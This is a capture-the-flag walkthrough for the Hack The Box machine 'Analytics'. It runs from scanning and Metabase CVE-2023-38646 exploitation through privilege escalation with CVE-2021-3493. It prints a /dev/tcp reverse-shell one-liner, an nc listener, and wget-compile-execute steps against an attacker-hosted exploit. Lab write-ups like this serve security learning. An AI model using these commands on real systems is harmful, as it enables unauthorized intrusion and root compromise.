# HTB Machine Walkthrough: Analytics

  

---

> [!IMPORTANT]

> **Please use this as a hint or guide if you're blocked at some point of this machine. I make these files for myself and to help some friends that are also doing these machines.**

  

> [!NOTE]

> **Try to get as far as you can by yourself or you will never learn to solve machines alone. Hope you the best and happy hacking <3.**

---

  

## 1. Fast Nmap Scan on the Provided IP

Start by scanning all ports to identify the open ones:

```bash
nmap -sS -p- --min-rate 5000 $machine_ip -vvv -oN nmap.txt
```

This reveals ports 22 (SSH) and 80 (HTTP) are open. ( I try to save the scan results just in case i need something of it later )

## 2. Recognition


Perform a service detection scan to identify versions and services:

```bash
nmap -p22,80 -sCV $machine_ip -vvv -oN serv_recon.txt
```

The results show that port 80 hosts an `nginx/1.18.0` server that redirects to `http://analytical.htb/`.

To discover subdomains, use FFUF:

```bash

ffuf -u  http://$machine_ip -H "Host: FUZZ.analytical.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

```

A subdomain `data.analytical.htb` is identified, which reveals a Metabase login page when accessed.

  

## 3. Exploit Phase

  

### Exploiting CVE-2023-38646

  

Metabase is vulnerable to a pre-authenticated remote code execution vulnerability.

Retrieve the `setup-token` using the API endpoint:

```bash

curl http://data.analytical.htb/api/session/properties -s | jq -r '."setup-token"'

```
Prepare a reverse shell payload:

```bash

echo 'bash -i >& /dev/tcp/$YourMachine_IP/$NC_ListenerPort 0>&1' | base64

```
Start a netcat listener to capture the reverse shell:

```bash

nc -lnvp $NC_ListenerPort

```

Use Burp Suite or curl to send a crafted POST request to exploit the vulnerability. This provides access as the `metabase` user in a Docker container.

  

## 4. Privilege Escalation to "metalytics"

Inspect environment variables to find credentials (linpeas also works) :
```bash
env
```

The variables reveal credentials for the user `metalytics`. Use SSH to log in:
```bash
ssh  metalytics@$machine_ip
```
Now as user, retrieve and submit the user flag
```bash
cat user.txt
```
## 5. Privilege Escalation to Root

Check the kernel version for known vulnerabilities:
```bash
uname  -r
```

For this machine, [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493/tree/main) so you just have to get into the repository and follow the steps to take advantage of this vector.
  

On your local machine open a simple http server with python so you can send the file to the target:

```bash
python3  -m  http.server  8080
```

  

On the target machine, get the expoit, compile it with gcc and execute it:

```bash
wget  http://10.10.14.101:8080/exploit.c

gcc  exploit.c  -o  exploit

./exploit
```
Now you should be root user, now just retrieve the root flag and submit it.

```bash

cat  /root/root.txt

```

  

---

**Congratulations: Machine completed**

---